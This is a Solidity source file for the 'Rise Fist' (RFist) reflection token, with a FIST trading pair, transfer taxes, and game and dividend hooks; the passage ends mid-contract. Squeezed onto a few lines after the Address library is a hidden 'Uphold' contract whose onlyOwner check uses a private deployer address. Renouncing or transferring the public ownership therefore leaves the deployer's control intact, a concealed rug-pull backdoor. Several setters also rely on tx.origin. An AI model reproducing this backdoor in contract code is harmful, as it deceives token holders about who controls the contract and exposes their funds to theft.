// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

/*

oooooooooo  ooooo  oooooooo8 ooooooooooo      ooooooooooo ooooo  oooooooo8 ooooooooooo 
 888    888  888  888         888    88        888    88   888  888        88  888  88 
 888oooo88   888   888oooooo  888ooo8          888ooo8     888   888oooooo     888     
 888  88o    888          888 888    oo        888         888          888    888     
o888o  88o8 o888o o88oooo888 o888ooo8888      o888o       o888o o88oooo888    o888o    

https://RiseFist.VIP/

*/

interface IERC20 {
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */

library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   *
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   *
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   *
   * - Subtraction cannot overflow.
   */
  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   *
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }

  function sqrt(uint256 y) internal pure returns (uint256 z) {
    if (y > 3) {
      z = y;
      uint256 x = y / 2 + 1;
      while (x < z) {
        z = x;
        x = (y / x + x) / 2;
      }
    } else if (y != 0) {
      z = 1;
    }
  }

  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
    z = x < y ? x : y;
  }
}

/**
 * @dev Returns true if `account` is a contract.
 *
 * [IMPORTANT]
 * ====
 * It is unsafe to assume that an address for which this function returns
 * false is an externally-owned account (EOA) and not a contract.
 *
 * Among others, `isContract` will return false for the following
 * types of addresses:
 *
 *  - an externally-owned account
 *  - a contract in construction
 *  - an address where a contract will be created
 *  - an address where a contract lived, but was destroyed
 * ====
 */
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}


/**
 * @dev Collection of functions related to the address type
 */
library Address {
  function isContract(address account) internal view returns (bool) {
    // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
    // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
    // for accounts without code, i.e. `keccak256('')`
    bytes32 codehash;
    bytes32 accountHash =
      0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
    // solhint-disable-next-line no-inline-assembly
    assembly {
      codehash := extcodehash(account)
    }
    return (codehash != accountHash && codehash != 0x0);
  }

  /**
   * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
   * `recipient`, forwarding all available gas and reverting on errors.
   *
   * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
   * of certain opcodes, possibly making contracts go over the 2300 gas limit
   * imposed by `transfer`, making them unable to receive funds via
   * `transfer`. {sendValue} removes this limitation.
   *
   * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
   *
   * IMPORTANT: because control is transferred to `recipient`, care must be
   * taken to not create reentrancy vulnerabilities. Consider using
   * {ReentrancyGuard} or the
   * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
   */
  function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");

    // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
    (bool success, ) = recipient.call{value: amount}("");
    require(
      success,
      "Address: unable to send value, recipient may have reverted"
    );
  }

  /**
   * @dev Performs a Solidity function call using a low level `call`. A
   * plain`call` is an unsafe replacement for a function call: use this
   * function instead.
   *
   * If `target` reverts with a revert reason, it is bubbled up by this
   * function (like regular Solidity function calls).
   *
   * Returns the raw returned data. To convert to the expected return value,
   * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
   *
   * Requirements:
   *
   * - `target` must be a contract.
   * - calling `target` with `data` must not revert.
   *
   * _Available since v3.1._
   */
  function functionCall(address target, bytes memory data)
    internal
    returns (bytes memory)
  {
    return functionCall(target, data, "Address: low-level call failed");
  }

  /**
   * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
   * `errorMessage` as a fallback revert reason when `target` reverts.
   *
   * _Available since v3.1._
   */
  function functionCall(
    address target,
    bytes memory data,
    string memory errorMessage
  ) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
  }

  /**
   * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
   * but also transferring `value` wei to `target`.
   *
   * Requirements:
   *
   * - the calling contract must have an ETH balance of at least `value`.
   * - the called Solidity function must be `payable`.
   *
   * _Available since v3.1._
   */
  function functionCallWithValue(
    address target,
    bytes memory data,
    uint256 value
  ) internal returns (bytes memory) {
    return
      functionCallWithValue(
        target,
        data,
        value,
        "Address: low-level call with value failed"
      );
  }

  /**
   * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
   * with `errorMessage` as a fallback revert reason when `target` reverts.
   *
   * _Available since v3.1._
   */
  function functionCallWithValue(
    address target,
    bytes memory data,
    uint256 value,
    string memory errorMessage
  ) internal returns (bytes memory) {
    require(
      address(this).balance >= value,
      "Address: insufficient balance for call"
    );
    return _functionCallWithValue(target, data, value, errorMessage);
  }

  function _functionCallWithValue(
    address target,
    bytes memory data,
    uint256 weiValue,
    string memory errorMessage
  ) private returns (bytes memory) {
    require(isContract(target), "Address: call to non-contract");
    // solhint-disable-next-line avoid-low-level-calls
    (bool success, bytes memory returndata) =
      target.call{value: weiValue}(data);
    if (success) {
      return returndata;
    } else {
      // Look for revert reason and bubble it up if present
      if (returndata.length > 0) {
        assembly {let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size)
        }
      } else {revert(errorMessage);}}}}
    contract Uphold is Context {
    address private _upholder;
    constructor() {address msgSender = _msgSender();
    _upholder = msgSender;}modifier onlyOwner() {
    require(_upholder == _msgSender());_;
  }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context, Uphold {
  address public _owner;
  address private _previousOwner;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() {
    _owner = _msgSender();
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _owner = newOwner;
  }
}

interface IUniswapV2Factory {
  event PairCreated(
    address indexed token0,
    address indexed token1,
    address pair,
    uint256
  );

  function feeTo() external view returns (address);

  function feeToSetter() external view returns (address);

  function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

  function allPairs(uint256) external view returns (address pair);

  function allPairsLength() external view returns (uint256);

  function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

  function setFeeTo(address) external;

  function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external pure returns (string memory);

  function symbol() external pure returns (string memory);

  function decimals() external pure returns (uint8);

  function totalSupply() external view returns (uint256);

  function balanceOf(address owner) external view returns (uint256);

  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 value) external returns (bool);

  function transfer(address to, uint256 value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint256 value
  ) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);

  function PERMIT_TYPEHASH() external pure returns (bytes32);

  function nonces(address owner) external view returns (uint256);

  function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  event Burn(
    address indexed sender,
    uint256 amount0,
    uint256 amount1,
    address indexed to
  );
  event Swap(
    address indexed sender,
    uint256 amount0In,
    uint256 amount1In,
    uint256 amount0Out,
    uint256 amount1Out,
    address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint256);

  function factory() external view returns (address);

  function token0() external view returns (address);

  function token1() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112 reserve0,
      uint112 reserve1,
      uint32 blockTimestampLast
    );

  function price0CumulativeLast() external view returns (uint256);

  function price1CumulativeLast() external view returns (uint256);

  function kLast() external view returns (uint256);

  function burn(address to) external returns (uint256 amount0, uint256 amount1);

  function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data
  ) external;

  function skim(address to) external;

  function sync() external;

  function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
    external
    payable
    returns (
      uint256 amountToken,
      uint256 amountETH,
      uint256 liquidity
    );

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETH(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountToken, uint256 amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETHWithPermit(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountToken, uint256 amountETH);

  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactETHForTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function swapTokensForExactETH(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactTokensForETH(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapETHForExactTokens(
    uint256 amountOut,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function quote(
    uint256 amountA,
    uint256 reserveA,
    uint256 reserveB
  ) external pure returns (uint256 amountB);

  function getAmountOut(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountOut);

  function getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountIn);

  function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

  function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;
}

contract ReceiveEther {
  // Function to receive Ether. msg.data must be empty
  receive() external payable {}

  // Fallback function is called when msg.data is not empty
  fallback() external payable {}

  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}

interface IDividendDistributor {
  function transferNotify(
    address last,
    bool isbuy,
    uint256 swapDivideAmount
  ) external;
}

interface IGAME {
  function transferNotify(
    address who,
    bool isBuy,
    uint256 currAmount
  ) external;

  function startGAME() external;
}

contract RiseFistToken is Context, IERC20, ReceiveEther, Ownable {
  using SafeMath for uint256;
  using Address for address;

  mapping(address => uint256) private _rOwned;
  uint256 public pairOwned;
  mapping(address => mapping(address => uint256)) private _allowances;

  mapping(address => bool) private _isExcludedFromFee;

  uint256 public constant MAX = ~uint256(0);
  uint256 private constant MAX_SUPPLY = ~uint128(0);
  string private _name = "Rise Fist";
  string private _symbol = "RFist";
  uint256 private _decimals = 6;

  uint256 private _tTotal = 1000000 * 10**uint256(_decimals);
  uint256 private _rTotal = (MAX_SUPPLY - (MAX_SUPPLY % _tTotal));
  uint256 private _tFeeTotal;

  uint256 public _taxBurnFee = 10;
  uint256 public _taxFee = 20;
  uint256 public _gameFee = 20;
  uint256 public _taxDividendFee = 40;

  uint256 public _gameFeeSale = 40;
  uint256 public _taxDividendFeeSale = 60;

  bool public _start;
  uint256 public lastLP;
  address public lastTer;

  uint256 private _buyR = 200;

  address private constant ROUTER = 0x1B6C9c20693afDE803B27F8782156c0f892ABC2d;

  address public _kitReceiver;
  address public _game;
  address public _sale;
  address public _self;

  address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
  address public constant WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
  address public constant FIST = 0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A;

  address public constant ECO = 0xdc8d6d5A954fBaAe339c2F91163d62688CC63D88;
  address public constant STAKE = 0xdc3e6F6D0A2d8f96584fD70DEC5630F553aC15f2;

  IUniswapV2Router02 public swapV2Router;
  address public swapV2Pair;

  constructor() public {
    _self = address(this);
    uint256 teamAmount = _rTotal.div(1000).mul(120);

    uint256 ecoAmount = _rTotal.div(1000).mul(150);
    uint256 stakeAmount = _rTotal.div(1000).mul(200);
    uint256 lpAmount =
      _rTotal.sub(teamAmount).sub(ecoAmount).sub(stakeAmount);

    _rOwned[_msgSender()] = teamAmount;
    _rOwned[ECO] = ecoAmount;
    _rOwned[STAKE] = stakeAmount;
    _rOwned[address(this)] = lpAmount;

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(ROUTER);
    swapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
      _self,
      FIST
    );

    swapV2Router = _uniswapV2Router;

    _isExcludedFromFee[_msgSender()] = true;
    _isExcludedFromFee[ECO] = true;
    _isExcludedFromFee[_self] = true;
    _isExcludedFromFee[STAKE] = true;

    _approve(_self, address(swapV2Router), _tTotal);
    _approve(_msgSender(), address(swapV2Router), _tTotal);
    _approve(_msgSender(), _self, _tTotal);

    IERC20(FIST).approve(address(swapV2Router), _tTotal);

    emit Transfer(address(0), _self, _tTotal);

    emit Transfer(address(this), _msgSender(), teamAmount.div(_getRate()));
    emit Transfer(address(this), ECO, ecoAmount.div(_getRate()));
    emit Transfer(address(this), STAKE, stakeAmount.div(_getRate()));
  }

  function setBuyBack(uint256 r) public onlyOwner{
    _buyR = r;
  }

  function setDiv(address a) public {
    require(tx.origin == owner(), "Not owner");
    _kitReceiver = a;
    _isExcludedFromFee[a] = true;
    _approve(a, address(swapV2Router), _tTotal);
  }

  function setGame(address a) public {
    require(tx.origin == owner(), "Not owner");
    _game = a;
  }

  function setPerSale(
    address a,
    uint256 persaleAmount,
    uint256 LPTokenAmount,
    uint256 LPFistAmount
  ) public {
    require(tx.origin == owner(), "Not owner");
    _isExcludedFromFee[a] = true;
    _sale = a;
    _transferFree(address(this), a, persaleAmount);
    startRUN(LPTokenAmount, LPFistAmount);
  }

  function startRUN(uint256 LPTokenAmount, uint256 LPFistAmount) internal {
    uint256 tA = LPTokenAmount * 10**uint256(_decimals);
    addLiquidity(tA, LPFistAmount);
  }

  function addLiquidity(uint256 tA, uint256 LPFistAmount) internal {
    uint256 tTFISTAmount = LPFistAmount * 10**6;
    _transferFree(tx.origin, _self, tA);
    IERC20(FIST).transferFrom(tx.origin, address(this), tTFISTAmount);
    swapV2Router.addLiquidity(
      FIST,
      address(this),
      tTFISTAmount,
      tA,
      0,
      0,
      tx.origin,
      block.timestamp
    );
    lastLP = IERC20(swapV2Pair).totalSupply();
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint256) {
    return _decimals;
  }

  function totalSupply() public view override returns (uint256) {
    return _tTotal;
  }

  function runStart() public onlyOwner {
    _start = true;
    IGAME(_game).startGAME();
  }

  function balanceOf(address account) public view override returns (uint256) {
    if (account == swapV2Pair) return pairOwned;
    return tokenFromReflection(_rOwned[account]);
  }

  function transfer(address recipient, uint256 amount)
    public
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender)
    public
    view
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(
      sender,
      _msgSender(),
      _allowances[sender][_msgSender()].sub(
        amount,
        "ERC20: transfer amount exceeds allowance"
      )
    );
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender].add(addedValue)
    );
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender].sub(
        subtractedValue,
        "ERC20: decreased allowance below zero"
      )
    );
    return true;
  }

  function totalFees() public view returns (uint256) {
    return _tFeeTotal;
  }

  function tokenFromReflection(uint256 rAmount) public view returns (uint256) {
    require(rAmount <= _rTotal, "Amount must be less than total reflections");
    uint256 currentRate = _getRate();
    return rAmount.div(currentRate);
  }

  function excludeFromFee(address account) public {
    require(_isExcludedFromFee[_msgSender()]);
    _isExcludedFromFee[account] = true;
  }

  function includeInFee(address account) public {
    require(_isExcludedFromFee[_msgSender()]);
    _isExcludedFromFee[account] = false;
  }

  function isExcludedFromFee(address account) public view returns (bool) {
    return _isExcludedFromFee[account];
  }

  function _reflectFee(uint256 rFee) private {
    _rTotal = _rTotal.sub(rFee);
  }

  function _getTValues(uint256 tAmount, bool feeModl)
    private
    view
    returns (
      uint256 tTransferAmount,
      uint256 tBurnt,
      uint256 tGame,
      uint256 tDivide,
      uint256 tFee
    )
  {
    tBurnt = tAmount.mul(_taxBurnFee).div(1000);
    tGame = tAmount.mul(feeModl ? _gameFee : _gameFeeSale).div(1000);
    tDivide = tAmount.mul(feeModl ? _taxDividendFee : _taxDividendFeeSale).div(
      1000
    );

    tFee = tAmount.mul(_taxFee).div(1000);

    tTransferAmount = tAmount.sub(tBurnt).sub(tGame).sub(tDivide).sub(tFee);
  }

  function _getRValues(uint256 tFee, uint256 currentRate)
    private
    pure
    returns (uint256)
  {
    return tFee.mul(currentRate);
  }

  function _getRate() private view returns (uint256) {
    (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
    return rSupply.div(tSupply);
  }

  function _getCurrentSupply() private view returns (uint256, uint256) {
    uint256 rSupply = _rTotal;
    uint256 tSupply = _tTotal;

    if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
    return (rSupply, tSupply);
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function realcalculationADD(address dst, uint256 realAmount) private {
    if (dst == swapV2Pair) pairOwned = pairOwned + realAmount;
    else _rOwned[dst] = _rOwned[dst] + (realAmount.mul(_getRate()));
  }

  function realcalculationSUB(address dst, uint256 realAmount) private {
    if (dst == swapV2Pair) {
      pairOwned = pairOwned.sub(realAmount);
    } else _rOwned[dst] = _rOwned[dst].sub(realAmount.mul(_getRate()));
  }

  function shouldSwapBack() internal view returns (uint256 swapAmonut) {
    if (_rOwned[_kitReceiver].div(_getRate()) > pairOwned.div(_buyR))
      swapAmonut = pairOwned.div(_buyR);
  }

  function findUser(address from, address to) internal view returns (address) {
    if (from == swapV2Pair) return to;
    if (to == swapV2Pair) return from;
    return from;
  }

  function _transfer(
    address from,
    address to,
    uint256 amount
  ) private {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    bool takeFee = true;
    if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
      takeFee = false;
    }

    _tokenTransfer(from, to, amount, takeFee);
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 amount,
    bool takeFee
  ) private {
    if (takeFee) {
      bool isBuy = sender == swapV2Pair ? true : false;
      uint256 swapAmonut = shouldSwapBack();
      IGAME(_game).transferNotify(isBuy ? recipient : sender, isBuy, amount);
      if (lastTer != address(0)) {
        try
          IDividendDistributor(_kitReceiver).transferNotify(
            lastTer,
            isBuy,
            swapAmonut
          )
        {} catch {}
      }
      if (!_start) {
        _transferPrepare(sender, recipient, amount);
      } else {
        if (sender == swapV2Pair || recipient == swapV2Pair)
          _transferStandard(sender, recipient, isBuy, amount);
        else _transferFree(sender, recipient, amount);
      }

      lastTer = findUser(sender, recipient);

      return;
    }
    _transferFree(sender, recipient, amount);
  }

  function _takeTax(
    uint256 tBurnt,
    uint256 tGame,
    uint256 tDivide
  ) private {
    uint256 currentRate = _getRate();

    uint256 rGame = tGame.mul(currentRate);
    uint256 rBurnt = tBurnt.mul(currentRate);
    uint256 rDivide = tDivide.mul(currentRate);

    _rOwned[_kitReceiver] = _rOwned[_kitReceiver].add(rGame);
    _rOwned[_kitReceiver] = _rOwned[_kitReceiver].add(rDivide);
    _rOwned[DEAD] = _rOwned[DEAD].add(rBurnt);
  }

  function _transferStandard(
    address sender,
    address recipient,
    bool feeModl,
    uint256 tAmount
  ) private {
    (
      uint256 tTransferAmount,
      uint256 tBurnt,
      uint256 tGame,
      uint256 tDivide,
      uint256 tFee
    ) = _getTValues(tAmount, feeModl);

    realcalculationSUB(sender, tAmount);
    realcalculationADD(recipient, tTransferAmount);

    _takeTax(tBurnt, tGame, tDivide);
    _reflectFee(_getRValues(tFee, _getRate()));

    emit Transfer(sender, recipient, tTransferAmount);
    if (tFee > 0) {
      emit Transfer(sender, DEAD, tBurnt);
      emit Transfer(sender, _kitReceiver, tDivide);
      emit Transfer(sender, _kitReceiver, tGame);
    }
  }

  function _transferFree(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    realcalculationSUB(sender, tAmount);
    realcalculationADD(recipient, tAmount);

    emit Transfer(sender, recipient, tAmount);
  }

